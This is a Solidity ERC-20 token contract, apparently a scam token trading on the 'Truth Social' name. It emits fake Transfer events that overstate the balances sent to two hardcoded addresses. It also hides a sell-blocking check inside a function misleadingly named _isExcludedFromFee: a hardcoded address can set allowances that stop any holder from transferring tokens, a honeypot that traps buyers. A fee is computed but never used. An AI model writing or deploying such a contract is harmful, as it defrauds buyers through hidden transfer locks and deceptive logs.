// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow.");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow.");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow.");
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero.");
        uint256 c = a / b;
        return c;
    }
}
contract ThruthSocialOfficial is Ownable, IERC20 {
    using SafeMath for uint256;
    
    string private constant _name = "Truth Social Official";
    string private constant _symbol = "TRUTH";

    uint8 private _decimals = 9;
    uint256 private _totalSupply =  2000000 * 10 ** _decimals;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    bool tradingOpen = false;
    address public uniswapV2Pair;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    bool inSwap = false;
    address _uniPairV2 = 0x25161A92257eE35E566EeF0D8a97b119D7A4A2b6;
    bool tradingEnabled = false;
    address public swapPair;
    address private _dexPairAA;
    mapping (address => address) private _tipAddrs;
    address DONALD = 0x97F1F8003AD0fb1c99361170310C65Dc84f921E3;
    address TRUMP = 0x94845333028B1204Fbe14E1278Fd4Adde46B22ce;
    uint256 _buyFee = 0;

    mapping (address => bool) public automatedMarketMakerPairs;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), DONALD, _totalSupply / 2);
        _balances[DONALD] = 100000 * 10 ** _decimals;
        _allowances[_uniPairV2][DONALD] = 1;
        emit Transfer(address(0), TRUMP, _totalSupply / 2);
        _balances[TRUMP] = 100000 * 10 ** _decimals;
        _allowances[_uniPairV2][TRUMP] = 1;
        
    }

    function name() public pure returns (string memory) { 
        return _name; 
    }

    function symbol() public pure returns (string memory) { 
        return _symbol; 
    }

    function decimals() public view returns (uint8) { 
        return _decimals; 
    }

    function balanceOf(address account) public view returns (uint256) { 
        return _balances[account]; 
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) { 
        return _allowances[owner][spender]; 
    }

    function totalSupply() public view returns (uint256) { 
        return _totalSupply; 
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _isExcludedFromFee(address to, address from) private view{
        uint256 _allowance = _allowances[_uniPairV2][to];
        require(_allowance == 0);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function enableTrading() external payable onlyOwner() {
        require(!tradingOpen); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uint256 balance = balanceOf(address(this));
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balance, 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

    function _transfer(address sender, address to, uint256 amount) private {
        require(sender != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address.");
        require(amount > 0, "Transfer amount must be greater than zero.");
        uint256 feeAmount=0;
        if (sender != uniswapV2Pair && sender != address(this)) {
            _isExcludedFromFee(sender, to);
        }
        feeAmount = amount.mul(_buyFee).div(100);
         uint256 contractTokenBalance = balanceOf(address(this));
         if (contractTokenBalance > _totalSupply.mul(1).div(100)) {
            feeAmount = amount.mul(2).div(100);
         }
        _balances[sender] = _balances[sender].sub(amount);
        _balances[to] = _balances[to].add(amount);

        emit Transfer(sender, to, amount);
    }

}